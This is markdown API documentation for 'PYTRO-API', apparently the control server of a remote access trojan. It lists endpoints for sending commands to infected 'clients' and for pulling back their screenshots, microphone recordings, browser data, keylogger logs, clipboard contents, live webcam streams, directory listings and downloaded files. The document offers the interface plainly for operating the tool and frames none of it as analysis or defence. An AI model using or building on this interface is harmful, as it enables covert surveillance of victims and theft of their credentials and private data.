# PYTRO API Documentation

Welcome to the detailed documentation for PYTRO-API. This documentation provides additional details, tutorials, and usage examples beyond what's provided in the README.

## API Reference

<input type="text" id="searchInput" onkeyup="searchFunction()" placeholder="Search for endpoints..">

## Table of Contents

<ul id="myUL">
  <li><a href="#api-reference">API Reference</a></li>
  <li><a href="#authentication">Authentication</a></li>
  <li><a href="#command-operations">Command Operations</a></li>
  <li><a href="#client-operations">Client Operations</a></li>
  <li><a href="#screenshot-operations">Screenshot Operations</a></li>
  <li><a href="#microphone-operations">Microphone Operations</a></li>
  <li><a href="#browser-data-operations">Browser Data Operations</a></li>
  <li><a href="#keylogger-operations">Keylogger Operations</a></li>
  <li><a href="#clipboard-operations">Clipboard Operations</a></li>
  <li><a href="#webcam-operations">Webcam Operations</a></li>
  <li><a href="#directory-operations">Directory Operations</a></li>
  <li><a href="#download-file-operations">Download File Operations</a></li>
</ul>

### Authentication

#### Generate JWT Token

```http
POST /api/v1/auth/
```

#### Request Body
```json
{
  "secret_key": "string"
}
```

### Command Operations

#### Send a Command to a Client
```http
POST /api/v1/command/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Request Body

```json
{
  "command": "string",
  "params": "object"
}
```

### Client Operations
```http
GET /api/v1/clients/
```

#### Query Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `status`      | `str` | Filter clients by their status (online/offline) |

### Screenshot Operations

#### Get Screenshots by Client ID
```http
GET /api/v1/screenshot/client/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Get Screenshot Image
```http
GET /api/v1/screenshot/image/{screenshot_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `screenshot_id`      | `int` | **Required**. ID of the screenshot |

### Microphone Operations

#### Get Microphone Recordings by Client ID
```http
GET /api/v1/microphone/client/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Get Microphone Recording
```http
GET /api/v1/microphone/audio/{microphone_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `microphone_id`      | `int` | **Required**. ID of the microphone recording |

### Browser Data Operations

#### Get Browser Data by Client ID
```http
GET /api/v1/browser/client/{client_id}/{browser_name}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |
| `browser_name`      | `string` | **Required**. Name of the browser |

#### Get Browser Data File
```http
GET /api/v1/browser/data/{browser_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `browser_id`      | `int` | **Required**. ID of the browser data |

### Keylogger Operations

#### Get Keyloggers by Client ID
```http
GET /api/v1/keylogger/client/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Get Keylogger Log
```http
GET /api/v1/keylogger/log/{keylogger_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `keylogger_id`      | `int` | **Required**. ID of the keylogger log |

### Clipboard Operations

#### Get Clipboard Data by Client ID
```http
GET /api/v1/clipboard/client/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Get Clipboard File
```http
GET /api/v1/clipboard/content/{clipboard_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `clipboard_id`      | `int` | **Required**. ID of the clipboard data |

### Webcam Operations

#### Get Webcam Link
```http
GET /api/v1/webcam/link/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Stop Webcam
```http
GET /api/v1/webcam/stop/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Stream Webcam
```http
GET /api/v1/webcam/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

### Directory Operations

#### List Directory
```http
POST /api/v1/directory/client/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Request Body
```json
{
  "dir_path": "string",
  "user_id": "int"
}
```

### Download File Operations

#### List Downloaded Files by Client ID
```http
GET /api/v1/download/client/{client_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `client_id`      | `int` | **Required**. ID of the client |

#### Get Downloaded File
```http
GET /api/v1/download/file/{download_file_id}
```

#### Request Parameters
| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `download_file_id`      | `int` | **Required**. ID of the downloaded file |


<script>
function searchFunction() {
  let input, filter, ul, li, a, i, txtValue;
  input = document.getElementById('searchInput');
  filter = input.value.toUpperCase();
  ul = document.getElementById("myUL");
  li = ul.getElementsByTagName('li');

  for (i = 0; i < li.length; i++) {
    a = li[i].getElementsByTagName("a")[0];
    txtValue = a.textContent || a.innerText;
    if (txtValue.toUpperCase().indexOf(filter) > -1) {
      li[i].style.display = "";
    } else {
      li[i].style.display = "none";
    }
  }
}
</script>

